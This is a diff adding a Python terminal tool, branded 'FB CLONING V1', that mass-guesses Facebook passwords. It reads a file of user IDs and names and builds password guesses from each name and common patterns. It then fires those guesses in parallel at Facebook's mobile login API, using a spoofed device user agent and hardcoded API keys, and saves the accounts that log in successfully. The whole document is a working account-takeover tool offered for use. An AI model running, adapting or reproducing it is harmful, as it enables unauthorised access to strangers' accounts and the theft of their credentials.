+mxclrs="38;5"
+ro=(f"\033[{mxclrs};208")
+rb=(f"\033[{mxclrs};32")
+rc=(f"\033[{mxclrs};122m")
+rg= (f"\033[{mxclrs};112m")
+rp=(f"\033[{mxclrs};147m")
+
+os.system("clear")
+
+gxdsprnt = str(f"{white}" * 37)
+for gxdsloading in range(20):
+    time.sleep(0.3)
+    sys.stdout.write("\r   LOADING: " + gxdsanmtn3[gxdsloading % len(gxdsanmtn3)])
+    sys.stdout.flush()
+lxgo = f"""{light_gray}
+
+                              d8b             
+                              88P             
+                             d88              
+      d888b8b  ?88,  88P d888888   .d888b,    
+     d8P' ?88   `?8bd8P'd8P' ?88   ?8b,       
+     88b  ,88b  d8P?{light_purple}8b, 88b  ,88b    `?8b     
+    `?88P'`88b d8P' `?8b`?88P'`88b`?888P'     
+           )88      {rc}FB CLONING V1
+{light_purple}           ,88P                               
+       `?8888P                  {white}              \n"""
+
+def gxdslogo():
+    os.system("clear")
+    print(lxgo)
+    os.system("xdg-open https://www.facebook.com/goxdies")
+
+def main():
+    gxdslogo()
+    print("\033[1;97m  [1] FB CLONING\n  [2] EXIT TOOL")
+    print(gxdsprnt)
+    gxdsoption = input("\033[1;36m  [•] ENTER YOUR OPTION: ")
+    os.system("clear")
+    print(lxgo)
+    if gxdsoption in ["1"]:
+        cxde()
+    elif gxdsoption in ["2"]:
+        print(gxdsprnt)
+        print("  [•] SOON")
+        time.sleep(3)
+        main()
+    elif gxdsoption in ["3"]:
+        print(gxdsprnt)
+        print("  [•] K, BYE.")
+        os.system("xdg-open https://www.facebook.com/goxdies")
+        print(gxdsprnt)
+        sys.exit()
+    else:
+        print(gxdsprnt)
+        print("  [X] INVALID OPTION!")
+        print(gxdsprnt)
+        time.sleep(3)
+        main()
+
+def cxde():
+    gxdslogo()
+    print("\033[1;97m  [1] ASK FOR CODE\n  [2] EXIT TOOL")
+    print(gxdsprnt)
+    print("\033[1;33m  [-] IF YOU ALREADY HAVE CODE ENTER IT.\n  IF YOU DON'T HAVE ONE, PRESS 1.")
+    gxdsoption1 = input("\033[1;36m  [•] ENTER YOUR CODE: ")
+    os.system("clear")
+    print(lxgo)
+    if gxdsoption1 in ["GXDS"]:
+        gxdsfiles()
+    elif gxdsoption1 in ["1"]:
+        print(gxdsprnt)
+        print(lxgo)
+        print("  [•] REDIRECTING...")
+        os.system("xdg-open https://www.facebook.com/goxdies")
+    elif gxdsoption1 in ["2"]:
+        print(gxdsprnt)
+        print("  [•] K, BYE.")
+        os.system("xdg-open https://www.facebook.com/goxdies")
+        print(gxdsprnt)
+        sys.exit()
+    else:
+        print(gxdsprnt)
+        print("  [X] INVALID CODE!")
+        print(gxdsprnt)
+        time.sleep(3)
+        main()
+
+def gxdsfiles():
+    print(gxdsprnt)
+    fl = input(
+        "\033[1;97m  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  \033[1;33m[•] FILE PATH: "
+    )
+    os.system("clear")
+    print(lxgo)
+    print(gxdsprnt)
+    try:
+        id_file = open(fl, "r").read().splitlines()
+    except:
+        print("\033[1;91m  [X] FILE NOT FOUND.")
+        print(gxdsprnt)
+        sys.exit()
+    gxdsforward(id_file)
+
+
+def gxdsforward(id_file):
+    tl = str(len(id_file))
+    print("  \033[38;5;46m========================================")
+    print(
+        "\033[1;31m  [-] TIP: ON/OFF THE DATA EVERY 5 MINUTES\n           TO SPEED UP THE PROCESS. \n"
+    )
+    print("  \033[38;5;46m========================================")
+    print("\033[1;97m  [•] TOTAL ID IN FILE:\033[1;33m " + tl)
+    print("\033[1;97m  [•] PASSWORD LIST:\033[1;33m AUTOMATIC ")
+    print("\033[1;97m  [•] FILE SAVE IN:\033[1;33m /sdcard/gxds.txt\n")
+    print("  \033[38;5;46m========================================")
+
+    print(gxdsprnt)
+    with ThreadPool(max_workers=120) as feel:
+        for data in id_file:
+            uid = data.split("|")[0]
+            gxdspwd = []
+            gxdspwd.append("12345678")
+            gxdspwd.append("P@ssw0rd")
+            gxdspwd.append("123456")
+            gxdspwd.append("iloveyou")
+            gxdspwd.append("iloveyou123")
+            gxdspwd.append("1234567890")
+            gxdspwd.append("password")
+            gxdspwd.append("password123")
+            gxdspwd.append("Password")
+            gxdspwd.append("Password123")
+            gxdspwd.append("qwerty123")
+            gxdspwd.append("123456789")
+            gxdsnam = data.split("|")[1]
+            name = gxdsnam.lower()
+            try:
+                f_name = name.split(" ")[0]
+                gxdsnam1 = gxdsnam.split(" ")[0]
+                if len(f_name) < 3:
+                    pass
+                else:
+                    gxdspwd.append(gxdsnam1 + "123")
+                    gxdspwd.append(f_name + "12")
+                    gxdspwd.append(f_name + "123")
+                    gxdspwd.append(f_name + "123")
+                    gxdspwd.append(f_name + "1234")
+                    gxdspwd.append(f_name + "12345")
+                    gxdspwd.append(f_name + "@123")
+                    gxdspwd.append(f_name + "pogi")
+                    gxdspwd.append(f_name + "ganda")
+                    gxdspwd.append(f_name + "143")
+                    gxdspwd.append(f_name + "@143")
+            except:
+                pass
+            try:
+                mid_name = name.split(" ")[1]
+                gxdsnam2 = gxdsnam.split(" ")[1]
+                if len(mid_name) < 3:
+                    pass
+                else:
+                    gxdspwd.append(gxdsnam1 + " " + gxdsnam2)
+                    gxdspwd.append(mid_name + "12")
+                    gxdspwd.append(mid_name + "123")
+                    gxdspwd.append(mid_name + " 123")
+                    gxdspwd.append(mid_name + "1234")
+                    gxdspwd.append(mid_name + "12345")
+                    gxdspwd.append(mid_name + "@#")
+                    gxdspwd.append(mid_name + "@@")
+                    gxdspwd.append(mid_name + "@")
+                    gxdspwd.append(mid_name + "@123")
+                    # -Mix
+                    gxdspwd.append(f_name + mid_name)
+                    gxdspwd.append(f_name + mid_name + "143")
+                    gxdspwd.append(f_name + mid_name + "12")
+                    gxdspwd.append(f_name + mid_name + "123")
+                    gxdspwd.append(f_name + mid_name + "1234")
+                    gxdspwd.append(f_name + mid_name + "12345")
+                    gxdspwd.append(f_name + mid_name + "@#")
+                    gxdspwd.append(f_name + mid_name + "@@")
+                    gxdspwd.append(f_name + mid_name + "@")
+                    gxdspwd.append(f_name + mid_name + "@123")
+                    gxdspwd.append(f_name + " " + mid_name)
+                    gxdspwd.append(f_name + " " + mid_name + "123")
+                    gxdspwd.append(f_name + " " + mid_name + "143")
+                    gxdspwd.append(f_name + " " + mid_name + "1234")
+            except:
+                pass
+            try:
+                sur_name = name.split(" ")[2]
+                gxdsnam3 = gxdsnam.split(" ")[2]
+                if len(sur_name) < 3:
+                    pass
+                else:
+                    gxdspwd.append(sur_name + "123")
+                    gxdspwd.append(sur_name + "1234")
+                    gxdspwd.append(sur_name + "12345")
+                    gxdspwd.append(sur_name + "143")
+                    gxdspwd.append(f_name + mid_name + sur_name)
+                    gxdspwd.append(f_name + mid_name + sur_name + "123")
+                    gxdspwd.append(f_name + mid_name + sur_name + "1234")
+                    gxdspwd.append(f_name + mid_name + sur_name + "12345")
+                    gxdspwd.append(f_name + mid_name + sur_name + "@#")
+                    gxdspwd.append(f_name + mid_name + sur_name + "@@")
+                    gxdspwd.append(f_name + mid_name + sur_name + "@")
+                    gxdspwd.append(f_name + " " + sur_name)
+                    gxdspwd.append(f_name + " " + mid_name + " " + sur_name)
+                    gxdspwd.append(f_name + " " + mid_name + " " + sur_name + "123")
+            except:
+                pass
+            feel.submit(file_subb, uid, gxdspwd)
+
+
+loop = 0
+oks = []
+cps = []
+
+
+def file_subb(uid, gxdspwd):
+    global oks, loop, cps
+    sys.stdout.write(
+        f"\r \033[1;97m [CHECKED]: {loop} [HITS]: {str(len(oks))} [CHECKPOINT]: {str(len(cps))}"
+    )
+    sys.stdout.flush()
+    session = requests.Session()
+    try:
+        for ps in gxdspwd:
+            user_agent = "Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
+            data = {
+                "adid": str(uuid.uuid4()),
+                "format": "json",
+                "device_id": str(uuid.uuid4()),
+                "cpl": "true",
+                "family_device_id": str(uuid.uuid4()),
+                "credentials_type": "device_based_login_password",
+                "error_detail_type": "button_with_disabled",
+                "source": "device_based_login",
+                "email": uid,
+                "password": ps,
+                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+                "generate_session_cookies": "1",
+                "meta_inf_fbmeta": "",
+                "advertiser_id": str(uuid.uuid4()),
+                "currently_logged_in_userid": "0",
+                "locale": "en_GB",
+                "client_country_code": "PH",
+                "method": "auth.login",
+                "fb_api_req_friendly_name": "authenticate",
+                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                "api_key": "882a8490361da98702bf97a021ddc14d",
+            }
+            headers = {
+                "User-Agent": user_agent,
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "graph.facebook.com",
+                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+                "X-FB-Connection-Type": "MOBILE.LTE",
+                "X-Tigon-Is-Retry": "False",
+                "X-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
+                "X-fb-device-group": "5120",
+                "X-FB-Friendly-Name": "ViewerReactionsMutation",
+                "X-FB-Request-Analytics-Tags": "graphservice",
+                "X-FB-HTTP-Engine": "Liger",
+                "X-FB-Client-IP": "True",
+                "X-FB-Server-Cluster": "True",
+                "X-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+            }
+            p = requests.post(
+                "https://b-graph.facebook.com/auth/login",
+                data=data,
+                headers=headers,
+                allow_redirects=False,
+            ).text
+            q = json.loads(p)
+            if "session_key" in q:
+                print(f"\r\r\033[0;36m  [OK] {uid} || {ps}")
+                open("/sdcard/gxds-ok.txt", "a+").write(
+                    "[OK]" + uid + " || " + ps + "\n"
+                )
+                oks.append(uid)
+                break
+            elif "Please Confirm Email" in q:
+                print(f"\r\r\033[94m  [CE] {uid} || {ps}\n")
+                open("/sdcard/gxds-ce.txt", "a+").write(
+                    "[CE]" + uid + " || " + ps + "\n"
+                )
+                oks.append(uid)
+            elif "www.facebook.com" in q:
+                print(f"\r\r\033[1;91m  [CP] {uid} : {ps}")
+                cps.append(uid)
+            else:
+                continue
+        loop += 1
+    except:
+        time.sleep(4)
+
+
+main()
